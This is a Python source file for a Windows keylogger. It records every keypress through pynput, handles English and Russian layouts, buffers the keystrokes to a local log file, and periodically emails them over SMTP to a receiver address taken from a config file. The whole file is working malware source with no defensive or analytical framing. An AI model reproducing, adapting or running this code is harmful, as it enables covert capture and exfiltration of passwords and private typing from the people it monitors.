from pynput import keyboard
from time import sleep
from threading import Thread
from datetime import datetime
from email.mime.text import MIMEText
from email.header import Header
from smtplib import SMTP
import ctypes

def err_handler(function):
    def wrapper(*args,**kwargs):
        try:
            result = function(*args,**kwargs)
            return result
        except Exception as err:
            with open('error_log.txt','a') as err_file:
                err_file.write(get_date() +'in ' + function.__name__ + ' ' + str(err.args) + '\n')
            exit()
    return wrapper

def get_date():
    date = datetime.now()
    date_str = '[{0:0>2}-{1:0>2}-{2:0>4} {3:0>2}:{4:0>2}] '.format(date.day, date.month, date.year, date.hour, date.minute)
    return date_str

@err_handler
def get_json_config(file):
    from json import load
    with open('conf.json','r') as file:
        json_data = load(file)
    return json_data
    
class Logger(Thread):

    @err_handler
    def __init__(self):
        Thread.__init__(self)
        self.chars = []
        self.mutex = False

    @err_handler 
    def run(self):
        while True:
            sleep(DUMP_TO_FILE_TIME)
            print(get_date(),'checking for data to dump to file')
            if self.chars:
                bufered_chars = self.chars[:]
                self.chars = []
                while sender.mutex:
                    print(get_date(),'mutexed by sender')
                    sleep(0.5)
                self.mutex = True
                with open('log.txt','a') as file:file.write(''.join(bufered_chars))
                self.mutex = False
                print(get_date(),'a data was dumped to file')
            
class Sender(Thread):
    
    @err_handler
    def __init__(self):
        Thread.__init__(self)
        self.FROM = conf['login']
        self.TO = conf['receiver_email']
        self.PASS = conf['password']
        self.SMTP = conf['smtp_server']
        self.PORT = conf['server_port']
        self.mutex = False

    @err_handler
    def run(self):
        while True:
            sleep(FILE_TO_SEND_TIME)
            while logger.mutex:
                print(get_date(),'mutexed by logger')
                sleep(0.4)
            self.mutex = True
            with open('log.txt','r') as file:data = file.read()
            with open('log.txt','w') as file:file.write('')
            self.mutex = False
            print(get_date(),'checking for data to send')
            if data:
                msg = MIMEText(data, 'plain', 'utf-8')
                msg['Subject'] = get_date()
                msg['From'] = self.FROM
                msg['To'] = self.TO
                try:
                    smtpObj = SMTP(self.SMTP,self.PORT)
                    smtpObj.starttls()
                    smtpObj.ehlo()
                    smtpObj.login(self.FROM,self.PASS)
                    smtpObj.sendmail(self.FROM,self.TO,msg.as_string())
                    print(get_date(),'A new log was sent')
                except Exception as err:
                    print(get_date(),'a error occured while sendig email')
                    with open('error_log.txt','a') as err_file:
                        err_file.write(get_date() + str(err.args) + '\n')
@err_handler
def on_press(key):
    try:
        shift = 1 if user32.GetKeyState(0x10)>1 else 0
        caps = 1 if user32.GetKeyState(0x14) in (65409,1) else 0
        if user32.GetKeyboardLayout(thread_id) == START_LANG_ID:
            if shift^caps:
                logger.chars.append(start_lang[shift][char_to_int.get(key.char,47)].upper())  # 47 is the last one char 
            else:
                logger.chars.append(start_lang[shift][char_to_int.get(key.char,47)].lower())
        else:
            if shift^caps:
                logger.chars.append(second_lang[shift][char_to_int.get(key.char,47)].upper())
            else:    
                logger.chars.append(second_lang[shift][char_to_int.get(key.char,47)].lower())
    except AttributeError:
        logger.chars.append(special_keys.get(key.name,''))

                  
conf = get_json_config('conf.json')
DUMP_TO_FILE_TIME = conf['dump_to_file_time']
FILE_TO_SEND_TIME = conf['file_to_send_time']
special_keys = {'space':' ','backspace':' bcksp ','enter':' entr ','tab':' tab ','up':' up ','down':' down ','right':' right ','left':' left '}
en_mod_table = dict(zip(map(lambda ch:ch.decode('utf-8'),[b'`', b'~', b'1', b'!', b'2', b'@', b'3', b'#', b'4', b'$', b'5', b'%', b'6', b'^', b'7', b'&', b'8', b'*', b'9', b'(', b'0', b')', b'-', b'_', b'=', b'+', b'q', b'Q', b'w', b'W', b'e', b'E', b'r', b'R', b't', b'T', b'y', b'Y', b'u', b'U', b'i', b'I', b'o', b'O', b'p', b'P', b'[', b'{', b']', b'}', b'\\', b'|', b'a', b'A', b's', b'S', b'd', b'D', b'f', b'F', b'g', b'G', b'h', b'H', b'j', b'J', b'k', b'K', b'l', b'L', b';', b':', b"'", b'"', b'z', b'Z', b'x', b'X', b'c', b'C', b'v', b'V', b'b', b'B', b'n', b'N', b'm', b'M', b',', b'<', b'.', b'>', b'/', b'?'] ),[0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 7, 8, 8, 9, 9, 10, 10, 11, 11, 12, 12, 13, 13, 14, 14, 15, 15, 16, 16, 17, 17, 18, 18, 19, 19, 20, 20, 21, 21, 22, 22, 23, 23, 24, 24, 25, 25, 26, 26, 27, 27, 28, 28, 29, 29, 30, 30, 31, 31, 32, 32, 33, 33, 34, 34, 35, 35, 36, 36, 37, 37, 38, 38, 39, 39, 40, 40, 41, 41, 42, 42, 43, 43, 44, 44, 45, 45, 46, 46]))
ru_mod_table = dict(zip(map(lambda ch:ch.decode('utf-8'),[b'', b'\xd1\x91', b'\xd0\x81', b'1', b'!', b'2', b'"', b'3', b'\xe2\x84\x96', b'4', b';', b'5', b'%', b'6', b':', b'7', b'?', b'8', b'*', b'9', b'(', b'0', b')', b'-', b'_', b'=', b'+', b'\xd0\xb9', b'\xd0\x99', b'\xd1\x86', b'\xd0\xa6', b'\xd1\x83', b'\xd0\xa3', b'\xd0\xba', b'\xd0\x9a', b'\xd0\xb5', b'\xd0\x95', b'\xd0\xbd', b'\xd0\x9d', b'\xd0\xb3', b'\xd0\x93', b'\xd1\x88', b'\xd0\xa8', b'\xd1\x89', b'\xd0\xa9', b'\xd0\xb7', b'\xd0\x97', b'\xd1\x85', b'\xd0\xa5', b'\xd1\x8a', b'\xd0\xaa', b'\\', b'/', b'\xd1\x84', b'\xd0\xa4', b'\xd1\x8b', b'\xd0\xab', b'\xd0\xb2', b'\xd0\x92', b'\xd0\xb0', b'\xd0\x90', b'\xd0\xbf', b'\xd0\x9f', b'\xd1\x80', b'\xd0\xa0', b'\xd0\xbe', b'\xd0\x9e', b'\xd0\xbb', b'\xd0\x9b', b'\xd0\xb4', b'\xd0\x94', b'\xd0\xb6', b'\xd0\x96', b'\xd1\x8d', b'\xd0\xad', b'\xd1\x8f', b'\xd0\xaf', b'\xd1\x87', b'\xd0\xa7', b'\xd1\x81', b'C', b'\xd0\xbc', b'\xd0\x9c', b'\xd0\xb8', b'\xd0\x98', b'\xd1\x82', b'\xd0\xa2', b'\xd1\x8c', b'\xd0\xac', b'\xd0\xb1', b'\xd0\x91', b'\xd1\x8e', b'.', b',']),['', 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 7, 8, 8, 9, 9, 10, 10, 11, 11, 12, 12, 13, 13, 14, 14, 15, 15, 16, 16, 17, 17, 18, 18, 19, 19, 20, 20, 21, 21, 22, 22, 23, 23, 24, 24, 25, 25, 26, 26, 27, 27, 28, 28, 29, 29, 30, 30, 31, 31, 32, 32, 33, 33, 34, 34, 35, 35, 36, 36, 37, 37, 38, 38, 39, 39, 40, 40, 41, 41, 42, 42, 43, 43, 44, 44, 45, 46, 46]))
en_int_to_char = {0:dict(zip([0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47],map(lambda ch:ch.decode('utf-8'),[b'`', b'1', b'2', b'3', b'4', b'5', b'6', b'7', b'8', b'9', b'0', b'-', b'=', b'q', b'w', b'e', b'r', b't', b'y', b'u', b'i', b'o', b'p', b'[', b']', b'\\', b'a', b's', b'd', b'f', b'g', b'h', b'j', b'k', b'l', b';', b"'", b'z', b'x', b'c', b'v', b'b', b'n', b'm', b',', b'.', b'/', b'']))),1:dict(zip([0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47],map(lambda ch:ch.decode('utf-8'),[b'~', b'!', b'@', b'#', b'$', b'%', b'^', b'&', b'*', b'(', b')', b'_', b'+', b'q', b'w', b'e', b'r', b't', b'y', b'u', b'i', b'o', b'p', b'{', b'}', b'|', b'a', b's', b'd', b'f', b'g', b'h', b'j', b'k', b'l', b':', b'"', b'z', b'x', b'c', b'v', b'b', b'n', b'm', b'<', b'>', b'?', b''])))}
ru_int_to_char = {0:dict(zip([0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47],map(lambda ch:ch.decode('utf-8'),[b'\xd1\x91', b'1', b'2', b'3', b'4', b'5', b'6', b'7', b'8', b'9', b'0', b'-', b'=', b'\xd0\xb9', b'\xd1\x86', b'\xd1\x83', b'\xd0\xba', b'\xd0\xb5', b'\xd0\xbd', b'\xd0\xb3', b'\xd1\x88', b'\xd1\x89', b'\xd0\xb7', b'\xd1\x85', b'\xd1\x8a', b'\\', b'\xd1\x84', b'\xd1\x8b', b'\xd0\xb2', b'\xd0\xb0', b'\xd0\xbf', b'\xd1\x80', b'\xd0\xbe', b'\xd0\xbb', b'\xd0\xb4', b'\xd0\xb6', b'\xd1\x8d', b'\xd1\x8f', b'\xd1\x87', b'\xd1\x81', b'\xd0\xbc', b'\xd0\xb8', b'\xd1\x82', b'\xd1\x8c', b'\xd0\xb1', b'\xd1\x8e', b'.', b'']))),1:dict(zip([0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47],map(lambda ch:ch.decode('utf-8'),[b'\xd1\x91', b'!', b'"', b'\xe2\x84\x96', b';', b'%', b':', b'?', b'*', b'(', b')', b'_', b'+', b'\xd0\xb9', b'\xd1\x86', b'\xd1\x83', b'\xd0\xba', b'\xd0\xb5', b'\xd0\xbd', b'\xd0\xb3', b'\xd1\x88', b'\xd1\x89', b'\xd0\xb7', b'\xd1\x85', b'\xd1\x8a', b'/', b'\xd1\x84', b'\xd1\x8b', b'\xd0\xb2', b'\xd0\xb0', b'\xd0\xbf', b'\xd1\x80', b'\xd0\xbe', b'\xd0\xbb', b'\xd0\xb4', b'\xd0\xb6', b'\xd1\x8d', b'\xd1\x8f', b'\xd1\x87', b'\xd1\x81', b'\xd0\xbc', b'\xd0\xb8', b'\xd1\x82', b'\xd1\x8c', b'\xd0\xb1', b'\xd1\x8e', b',', b''])))}
user32 = ctypes.WinDLL('user32', use_last_error = True)
curr_window = user32.GetForegroundWindow()
thread_id = user32.GetWindowThreadProcessId(curr_window, 0)            
START_LANG_ID = user32.GetKeyboardLayout(thread_id)# 67699721 - eng # 68748313 - rus
char_to_int = en_mod_table if START_LANG_ID == 67699721 else ru_mod_table
start_lang,second_lang = (en_int_to_char,ru_int_to_char) if START_LANG_ID == 67699721 else (ru_int_to_char,en_int_to_char)
logger = Logger()
sender = Sender()
logger.start()
if conf['send_emails']:
    print('send_meails: false')
    sender.start()
with keyboard.Listener(on_press=on_press) as listener:listener.join()

